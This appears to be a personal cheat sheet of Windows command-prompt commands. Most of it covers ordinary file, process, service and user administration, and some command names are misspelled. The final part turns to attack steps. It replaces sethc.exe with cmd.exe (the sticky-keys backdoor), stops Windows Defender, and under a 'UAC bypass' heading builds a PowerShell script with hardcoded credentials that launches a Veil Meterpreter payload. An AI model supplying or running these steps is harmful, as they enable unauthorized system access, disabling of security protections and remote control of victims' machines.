start>run>cmd.exe
>start cmd.exe
>start cmd.exe /t:0a
>color /?
## dir creation
```sh
>mkdir c:\temp
>echo hey > cmd.exe
>del cmd.exe
>notepad file.txt
```
clear the screen
>cls
current working directory
>cd 
to find particular string in output
>sc query | find "Event"
show contents of a file
>type c:\windows\win.ini
command history
Alt+F7
how many files are in system32
dir /b c:\windows\system32 | find /c /v ""
what is the length of ini file
type c:\windows\win.ini | find /c /v ""

taskmgr.exe
explorer.exe
regedit.exe
msconfig.exe
lusrmgr.msc
control
control schedtsks
evetvwr.msc
services.msc
secpol.msc

find hidden directory
>dir /aHD
searching directory
>dir /b /s c:\ | find /i "wmic.exe"
>dir /b /s wmic.exe
>dir /b /s *wmic*
>dir /b /s c:\wmic.exe
searching file conents
>findstr /d:c:\windows/system32 "Admin" *
>findstr "Admin" *.ini
The net user command
>net user
>net user fred passwd /add
>net user fred *
account details
>net user fred
account deletion
net user fred /del
change ip address
>netsh int ip set address "Local area connection" static 192.168.10.10 255.255.255.0 192.168.10.1
show firewall settings
>netsh firewall show config

show running process
>tasklist
>tasklist /src
>tasklist /fi "imagename eq cms.exe" /m
>tasklist /m ntdll.dll
kill process
>taskkill /PID [pid]
>taskkill /PID [pid] /PID [pid2]
>taskkill /IM cmd.exe

stop services
>sc query dhcp
>sc stop dhcp


copy d:\windows\system32\sethc.exe d:\
copy /y d:\windows\system32\cmd.exe d:\windows\system32\sethc.exe



Checking your Windows version using CMD
   • systeminfo
      OR
   • Run > winver
Find log files in directory
   •  dir /s *log* 

Process
   • tasklist
   • taskkill /F /PID pid_number


Disable windows defender:
   •  sc stop WinDefend


UAC bypass:
   •  echo $username = "alice" > run.ps1
   •  echo $secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force >> run.ps1
     echo $mycreds = New-Object System.Management.Automation.PSCredential ("$username",$secpasswd) >> run.ps1
   •  echo Start-Process veil_meterpreter.bat  -Credential ($mycreds) >> run.ps1

   • powershell -ExecutionPolicy Bypass -File run.ps1 
